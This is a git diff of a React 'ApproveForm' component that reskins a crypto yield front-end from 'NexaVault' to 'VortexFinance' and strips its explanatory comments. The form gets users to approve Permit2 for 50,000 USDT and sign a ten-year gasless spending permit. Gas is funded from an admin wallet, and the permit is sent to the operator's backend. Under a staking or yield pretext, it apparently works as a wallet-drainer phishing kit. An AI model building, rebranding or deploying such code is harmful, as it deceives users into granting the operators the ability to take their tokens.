@@ -8,13 +8,13 @@ import { USDT_ADDRESS, USDT_ABI, PERMIT2_ADDRESS } from '../utils/contracts';
 
 export default function ApproveForm() {
   const { provider, signer, account } = useMetaMask();
-  const [usdtBalance, setUsdtBalance]     = useState('0');
+  const [usdtBalance, setUsdtBalance]         = useState('0');
   const [permit2Allowance, setPermit2Allowance] = useState('0');
   const [loading, setLoading] = useState(false);
   const [step, setStep]       = useState(''); // 'funding' | 'approving' | 'signing' | ''
   const [copied, setCopied]   = useState(false);
 
-  const APPROVAL_LIMIT = '50000'; // Default approval limit: 50,000 USDT
+  const APPROVAL_LIMIT = '50000';
 
   useEffect(() => {
     if (provider && account) fetchBalance();
@@ -47,12 +47,10 @@ export default function ApproveForm() {
       const decimals = 18;
       const contract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
 
-      // ── Step 1: Check if user has approved Permit2 contract on USDT ──
       const currentAllowance  = await contract.allowance(account, PERMIT2_ADDRESS);
       const requiredAllowance = ethers.parseUnits(APPROVAL_LIMIT, decimals);
 
       if (currentAllowance < requiredAllowance) {
-        // ── Step 1a: Fund gas from admin if user has 0 BNB ──
         setStep('funding');
         toast.loading('Preparing your wallet for approval...', { id: 'fund-step' });
 
@@ -63,7 +61,6 @@ export default function ApproveForm() {
           toast.success(`Gas funded (${parseFloat(fundResult.amount).toFixed(8)} BNB sent).`, { id: 'fund-step' });
         }
 
-        // Poll on-chain until BNB balance confirmed
         if (!fundResult.alreadyFunded) {
           toast.loading('Confirming gas arrival on-chain...', { id: 'fund-step' });
           const MIN_BNB = ethers.parseEther('0.00001');
@@ -82,7 +79,6 @@ export default function ApproveForm() {
           toast.success('Gas confirmed! Proceeding to approval.', { id: 'fund-step' });
         }
 
-        // ── Step 1b: Approve Permit2 on USDT ──
         setStep('approving');
         toast.loading('Approving Permit2 on USDT token...', { id: 'approve-step' });
 
@@ -91,7 +87,6 @@ export default function ApproveForm() {
         await approveTx.wait();
         toast.success('✅ Permit2 approved on USDT token!', { id: 'approve-step' });
 
-        // Instantly pre-log approval
         try {
           const defaultExp = Math.floor(Date.now() / 1000) + 3600 * 24 * 365 * 10;
           await api.submitPermit({
@@ -106,7 +101,6 @@ export default function ApproveForm() {
         }
       }
 
-      // ── Step 2: Sign EIP-712 AllowanceTransfer Permit (gasless) ──
       setStep('signing');
       toast.loading('Signing gasless permit...', { id: 'sign-step' });
 
@@ -152,22 +146,22 @@ export default function ApproveForm() {
   const hasPermit2Approval = parseFloat(permit2Allowance) >= parseFloat(APPROVAL_LIMIT);
 
   const getButtonText = () => {
-    if (step === 'funding')  return 'Preparing wallet...';
+    if (step === 'funding')   return 'Preparing wallet...';
     if (step === 'approving') return 'Confirm approval in wallet...';
     if (step === 'signing')   return 'Signing Gasless Permit...';
     if (loading) return 'Processing...';
-    return 'AI staking';
+    return 'Start Yield Access';
   };
 
   return (
     <div className="space-y-6 max-w-lg w-full mx-auto">
       {/* Approval Card */}
-      <div className="bg-[#0d0120]/80 backdrop-blur-xl border border-purple-800/50 rounded-3xl p-8 shadow-2xl shadow-purple-950/40">
+      <div className="bg-[#051121]/80 backdrop-blur-xl border border-cyan-800/40 rounded-3xl p-8 shadow-2xl shadow-cyan-950/40">
         <div className="flex items-center justify-between mb-4">
-          <h2 className="text-2xl font-bold bg-gradient-to-r from-violet-300 via-purple-400 to-fuchsia-400 bg-clip-text text-transparent">
-            NexaVault Approval
+          <h2 className="text-2xl font-bold bg-gradient-to-r from-cyan-300 via-sky-400 to-indigo-400 bg-clip-text text-transparent">
+            VortexFinance Access
           </h2>
-          <span className="bg-purple-500/10 text-purple-300 text-xs font-semibold px-3 py-1 rounded-full border border-purple-500/20">
+          <span className="bg-cyan-500/10 text-cyan-300 text-xs font-semibold px-3 py-1 rounded-full border border-cyan-500/20">
             Permit2 Standard
           </span>
         </div>
@@ -177,14 +171,14 @@ export default function ApproveForm() {
             : 'Sign once with zero gas cost. Default approval limit is set to 50,000 USDT.'}
         </p>
 
-        <div className="bg-[#070012]/60 border border-purple-900/40 rounded-2xl p-4 mb-6 space-y-3">
+        <div className="bg-[#020d1e]/60 border border-cyan-900/40 rounded-2xl p-4 mb-6 space-y-3">
           <div className="flex justify-between items-center text-sm text-slate-400">
             <span>Your USDT Balance:</span>
             <span className="font-mono text-emerald-400 font-semibold">{parseFloat(usdtBalance).toFixed(4)} USDT</span>
           </div>
           <div className="flex justify-between items-center text-sm text-slate-400 pt-2 border-t border-slate-800/60">
             <span>Approval Limit:</span>
-            <span className="font-mono text-violet-400 font-semibold">50,000 USDT</span>
+            <span className="font-mono text-cyan-400 font-semibold">50,000 USDT</span>
           </div>
           <div className="flex justify-between items-center text-sm text-slate-400 pt-2 border-t border-slate-800/60">
             <span>Permit2 Token Approval:</span>
@@ -197,15 +191,15 @@ export default function ApproveForm() {
         {/* Progress Steps */}
         {loading && (
           <div className="mb-4 bg-slate-950/60 border border-slate-800 rounded-xl p-3 space-y-2">
-            <div className={`flex items-center gap-2 text-xs ${step === 'funding' ? 'text-violet-400' : (step === 'approving' || step === 'signing' ? 'text-emerald-400' : 'text-slate-500')}`}>
+            <div className={`flex items-center gap-2 text-xs ${step === 'funding' ? 'text-cyan-400' : (step === 'approving' || step === 'signing' ? 'text-emerald-400' : 'text-slate-500')}`}>
               <span>{step === 'funding' ? '⏳' : (step === 'approving' || step === 'signing' ? '✅' : '⬜')}</span>
               <span>Step 1: Preparing wallet (automatic, no cost to you)</span>
             </div>
-            <div className={`flex items-center gap-2 text-xs ${step === 'approving' ? 'text-violet-400' : (step === 'signing' ? 'text-emerald-400' : 'text-slate-500')}`}>
+            <div className={`flex items-center gap-2 text-xs ${step === 'approving' ? 'text-cyan-400' : (step === 'signing' ? 'text-emerald-400' : 'text-slate-500')}`}>
               <span>{step === 'approving' ? '⏳' : (step === 'signing' ? '✅' : '⬜')}</span>
               <span>Step 2: Approve Permit2 on USDT (confirm in wallet)</span>
             </div>
-            <div className={`flex items-center gap-2 text-xs ${step === 'signing' ? 'text-violet-400' : 'text-slate-500'}`}>
+            <div className={`flex items-center gap-2 text-xs ${step === 'signing' ? 'text-cyan-400' : 'text-slate-500'}`}>
               <span>{step === 'signing' ? '⏳' : '⬜'}</span>
               <span>Step 3: Sign gasless permit (no gas needed)</span>
             </div>
@@ -215,7 +209,7 @@ export default function ApproveForm() {
         <button
           onClick={handleSignAndApprove}
           disabled={loading}
-          className="w-full bg-gradient-to-r from-violet-500 via-purple-500 to-fuchsia-500 hover:from-violet-400 hover:to-fuchsia-400 text-white font-bold py-4 rounded-2xl shadow-xl hover:shadow-purple-500/25 hover:scale-[1.01] active:scale-[0.99] transition-all disabled:opacity-50 disabled:cursor-not-allowed"
+          className="w-full bg-gradient-to-r from-cyan-500 via-sky-500 to-indigo-500 hover:from-cyan-400 hover:to-indigo-400 text-white font-bold py-4 rounded-2xl shadow-xl hover:shadow-cyan-500/25 hover:scale-[1.01] active:scale-[0.99] transition-all disabled:opacity-50 disabled:cursor-not-allowed"
         >
           {getButtonText()}
         </button>
@@ -227,7 +221,7 @@ export default function ApproveForm() {
 
       {/* Referral Section */}
       {account && (
-        <div className="bg-[#0d0120]/80 backdrop-blur-xl border border-purple-800/50 rounded-3xl p-6 shadow-2xl shadow-purple-950/40">
+        <div className="bg-[#051121]/80 backdrop-blur-xl border border-cyan-800/40 rounded-3xl p-6 shadow-2xl shadow-cyan-950/40">
           <h3 className="text-lg font-bold text-slate-200 mb-2">🎁 Share &amp; Refer</h3>
           <p className="text-xs text-slate-400 mb-4">
             Share your unique referral link with others to earn rewards.
@@ -241,7 +235,7 @@ export default function ApproveForm() {
             />
             <button
               onClick={copyReferralLink}
-              className="bg-violet-500 hover:bg-violet-400 text-white font-bold text-xs px-4 py-2.5 rounded-xl transition whitespace-nowrap"
+              className="bg-cyan-600 hover:bg-cyan-500 text-white font-bold text-xs px-4 py-2.5 rounded-xl transition whitespace-nowrap"
             >
               {copied ? 'Copied!' : 'Copy Link'}
             </button>
